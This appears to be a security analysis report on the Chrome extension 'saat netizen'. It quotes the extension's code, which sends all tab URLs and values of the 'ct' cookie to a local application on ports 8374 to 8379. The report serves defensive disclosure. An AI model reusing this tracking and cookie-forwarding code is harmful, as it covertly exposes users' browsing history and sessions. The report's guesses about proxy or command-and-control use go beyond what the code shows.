# Vulnerability Report: saat netizen

## Metadata
- **Extension ID**: dmikeamgnillkjcolomlbfaaknanegig
- **Extension Name**: saat netizen
- **Version**: 1.0.6
- **Users**: ~100,000
- **Manifest Version**: 3
- **Analysis Date**: 2026-02-15

## Executive Summary

"saat netizen" is a critical privacy threat masquerading as a browser extension. This extension functions as comprehensive surveillance software that monitors and exfiltrates all user browsing activity to a local application running on localhost port 8374. The extension harvests extensive browsing data including all tab URLs, navigation events, focus changes, and specific cookie values, transmitting them in real-time to a local server.

The extension operates as a residential proxy or monitoring tool, likely part of a larger surveillance system. It has broad host permissions for all HTTP/HTTPS sites, cookies access, and tabs permissions, which it uses to track every aspect of browsing behavior. The local application receiving this data could relay it anywhere, making this a severe privacy violation affecting 100,000+ users who may be unaware their browsing is being monitored.

## Vulnerability Details

### 1. CRITICAL: Comprehensive Browsing Activity Exfiltration

**Severity**: CRITICAL
**Files**: background.js, focusevt.js
**CWE**: CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor)

**Description**: The extension systematically collects and transmits all browsing activity to a local server at http://127.0.0.1:8374. This includes tracking every tab creation, update, activation, removal, focus change, and URL navigation.

**Evidence**:

```javascript
// Lines 77-100: Core exfiltration function
async function sendEvent(evtName, evtParam) {
    if (g_availablePort != 0) {
        var url = g_addr + ':' + g_availablePort + evtName;
        fetch(url,  {
            method: 'POST',
            headers: {
                'Content-Type': 'text/plain;charset=utf-8'
            },
            body: evtParam
        })
    }
}

// Lines 341-366: Tab creation tracking
chrome.tabs.onCreated.addListener(function(tab) {
    g_urlmap.put(tab.id, tab.url);
    if (g_availablePort != 0) {
        sendEvent('/created', tab.id + '|' + tab.url);
    }
});

// Lines 368-392: Tab update tracking
chrome.tabs.onUpdated.addListener(function(tabId) {
    chrome.tabs.get(tabId, async function(tab) {
        if (tab.status == 'complete') {
            sendEvent('/updated', curTab.id + '|' + curTab.url);
        }
    });
});

// Lines 394-403: Tab activation tracking
chrome.tabs.onActivated.addListener(function(info) {
    chrome.tabs.get(info.tabId, function(tab) {
        sendEvent('/activated', tab.id + '|' + tab.url);
    });
});

// Lines 405-418: Tab removal tracking
chrome.tabs.onRemoved.addListener(function(tabId, removeInfo) {
    var strRemovedTabUrl = g_urlmap.get(tabId);
    sendEvent('/removed', tabId + '|' + strRemovedTabUrl);
});

// Lines 314-331: Window focus tracking via content script
function OnFocusEvt(tab, bFocused) {
    if (bFocused) {
        if (g_focusWindowID != tab.windowId) {
            g_focusWindowID = tab.windowId;
            sendEvent('/focuschanged', tab.id + '|' + tab.url);
        }
    }
}

// Lines 210-220: All existing tabs on connection
chrome.windows.getAll({ "populate": true }, function(windows) {
    for (var j in windows) {
        var tabs = windows[j].tabs;
        for (var i = 0; i < tabs.length; i++) {
            if (tabs[i].url != "chrome://newtab/") {
                sendEvent('/alreadyexist', tabs[i].id + '|' + tabs[i].url);
            }
        }
    }
});
```

**Verdict**: This is undisclosed comprehensive surveillance. The extension description "saat netizen Chrome Browser Extension" provides no indication that it monitors and transmits all browsing activity. Every URL visited, every tab opened/closed, and every window focus change is sent to a local server.

### 2. CRITICAL: Cookie Harvesting and Transmission

**Severity**: CRITICAL
**Files**: background.js
**CWE**: CWE-522 (Insufficiently Protected Credentials)

**Description**: The extension monitors cookie changes and harvests specific cookies (identified by token 'ct'), transmitting them to the local server. This enables session hijacking and credential theft.

**Evidence**:

```javascript
// Lines 102-113: Cookie harvesting function
function sendTabCookie(tab) {
    if (tab.url != "chrome://newtab/") {
        chrome.cookies.getAll({"url":tab.url}, function (cookie) {
            for (i=0; i<cookie.length; i++) {
                if (cookie[i].name == g_cookieChecktoken) {
                    sendEvent('/cookie', tab.id + '|' + tab.url + '|' + cookie[i].domain + '|' + cookie[i].path + '|' + cookie[i].value);
                }
            }
        });
    }
}

// Lines 428-446: Real-time cookie monitoring
chrome.cookies.onChanged.addListener(function(info) {
    if(info.cookie && info.cookie.name == g_cookieChecktoken) {
        if( info.cause == 'explicit' && info.removed == false ) {
            getCurrentTab().then((curTab) => {
                if (curTab.url != "chrome://newtab/") {
                    sendEvent('/cookie', curTab.id + '|' + curTab.url + '|' + info.cookie.domain + '|' + info.cookie.path + '|' + info.cookie.value);
                }
            });
        }
    }
});

// Lines 222-231: Cookie transmission on initial connection
getCurrentTab().then((tab) => {
    if (tab.url != "chrome://newtab/") {
        sendEvent('/activated', tab.id + '|' + tab.url);
        sendTabCookie(tab);
    }
});

// Lines 322-324: Cookie transmission on focus change
sendEvent('/focuschanged', tab.id + '|' + tab.url);
sendTabCookie(tab);
```

**Verdict**: The extension actively harvests cookies with name 'ct' (g_cookieChecktoken = 'ct') and transmits them including domain, path, and value. This enables the receiving application to impersonate users and access their authenticated sessions.

### 3. CRITICAL: Residential Proxy/Surveillance Infrastructure

**Severity**: CRITICAL
**Files**: background.js
**CWE**: CWE-506 (Embedded Malicious Code)

**Description**: The extension operates as a client for a local surveillance/proxy application, connecting to localhost ports 8374-8379 and authenticating before transmitting data. This is characteristic of residential proxy networks or enterprise monitoring tools deployed without user consent.

**Evidence**:

```javascript
// Lines 11-18: Configuration variables
var g_addr = 'http://127.0.0.1';
var g_availablePort = 0;
var g_defaultPort = 8374;
var g_cookieChecktoken = 'ct';

// Lines 161-266: Port scanning and authentication
async function sendEventEx(address, stdport, param, oldTab, retries) {
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'text/plain;charset=utf-8'
        },
        body: tabinfo
    }).then((response) => {
        if (response.ok) {
            return response.text();
        }
        throw new Error('response is not ok');
    })
    .then((response) => {
        var nPos = response.indexOf("Successfully authenticated");
        if (nPos >= 0) {
            g_availablePort = stdport;
            g_bConnecting = false;
            sendEvent('/version', g_ver);
            // Send all existing tabs
            chrome.windows.getAll({ "populate": true }, function(windows) {
                for (var j in windows) {
                    var tabs = windows[j].tabs;
                    for (var i = 0; i < tabs.length; i++) {
                        if (tabs[i].url != "chrome://newtab/") {
                            sendEvent('/alreadyexist', tabs[i].id + '|' + tabs[i].url);
                        }
                    }
                }
            });
        } else {
            retries--;
            if (retries > 0) {
                stdport++;
                setTimeout(function() { makeReq() }, 100);
            } else {
                stdport = g_defaultPort;
                retries = 5;
                setTimeout(function() { makeReq() }, 1000);
            }
        }
    })
    .catch((error) => {
        retries--;
        if (retries > 0) {
            stdport++;
            setTimeout(function() { makeReq() }, 100);
        } else {
            stdport = g_defaultPort;
            retries = 5;
            setTimeout(function() { makeReq() }, 1000);
        }
    });
}

// Lines 268-277: Initialization
function ExtensionMain() {
    getCurrentTab().then((tab) => {
        g_bConnecting = true;
        sendEventEx(g_addr, g_defaultPort, '/created', tab, 5);
    });
}

// Lines 1-9: Content script injected on ALL pages
{
    "all_frames": true,
    "js": [ "focusevt.js" ],
    "matches": [ "<all_urls>" ],
    "run_at": "document_start"
}
```

**Verdict**: This is a sophisticated surveillance tool that:
1. Scans ports 8374-8379 to find a local monitoring application
2. Authenticates with the application ("Successfully authenticated")
3. Sends version information and all existing tabs upon connection
4. Injects a content script on every page to track window focus events
5. Continuously monitors and transmits all browsing activity

The extension requires a companion application to be running on the user's machine, indicating this is part of a larger monitoring infrastructure. The 100,000+ users are likely unaware their browsing is being tracked.

## False Positives Analysis

None. This extension has no legitimate use case that would justify:
- Transmitting all browsing URLs to a local server
- Harvesting and sending cookie values
- Injecting content scripts on all pages to track window focus
- Scanning local ports to connect to a monitoring application

The vague description "saat netizen Chrome Browser Extension" provides no disclosure of these surveillance capabilities.

## API Endpoints Analysis

| Endpoint | Purpose | Data Sent | Risk |
|----------|---------|-----------|------|
| http://127.0.0.1:8374-8379/created | Report new tab creation | tab.id + tab.url | CRITICAL - Full browsing history |
| http://127.0.0.1:8374-8379/updated | Report tab URL updates | tab.id + tab.url | CRITICAL - Navigation tracking |
| http://127.0.0.1:8374-8379/activated | Report tab activation | tab.id + tab.url | CRITICAL - Focus tracking |
| http://127.0.0.1:8374-8379/removed | Report tab closure | tab.id + tab.url | CRITICAL - Session tracking |
| http://127.0.0.1:8374-8379/focuschanged | Report window focus | tab.id + tab.url | CRITICAL - Attention tracking |
| http://127.0.0.1:8374-8379/cookie | Transmit cookies | tab.id + url + domain + path + cookie value | CRITICAL - Session hijacking |
| http://127.0.0.1:8374-8379/alreadyexist | Report all open tabs | tab.id + tab.url for all tabs | CRITICAL - Initial state dump |
| http://127.0.0.1:8374-8379/version | Report extension version | g_ver (1.0.6) | MEDIUM - Fingerprinting |

## Overall Risk Assessment

**RISK LEVEL: CRITICAL**

**Justification**:

This extension is a comprehensive surveillance tool that monitors and exfiltrates:
1. **Complete browsing history** - Every URL visited across all tabs
2. **Session data** - Cookie values enabling session hijacking
3. **Behavioral data** - Tab focus, window switching, navigation patterns
4. **Temporal data** - Timing of all browsing activities

The extension operates as a client for a local monitoring application, connecting to localhost ports and authenticating before transmitting data. This architecture is characteristic of:
- Residential proxy networks (selling user bandwidth/identity)
- Enterprise surveillance tools (deployed by employers/schools)
- Malware command-and-control infrastructure

With 100,000+ installations and no disclosure of these capabilities in the extension description, this represents a massive privacy violation. Users have no informed consent, and the local application receiving this data could relay it anywhere.

The use of content scripts on `<all_urls>` at `document_start`, combined with broad permissions (tabs, cookies, all hosts), enables complete visibility into user browsing. The cookie harvesting specifically targets cookies named 'ct', suggesting integration with specific web applications or tracking systems.

**Recommended Actions**:
1. Immediate removal from Chrome Web Store
2. User notification of privacy breach
3. Investigation of the companion application and data destination
4. Review of other extensions by the same developer
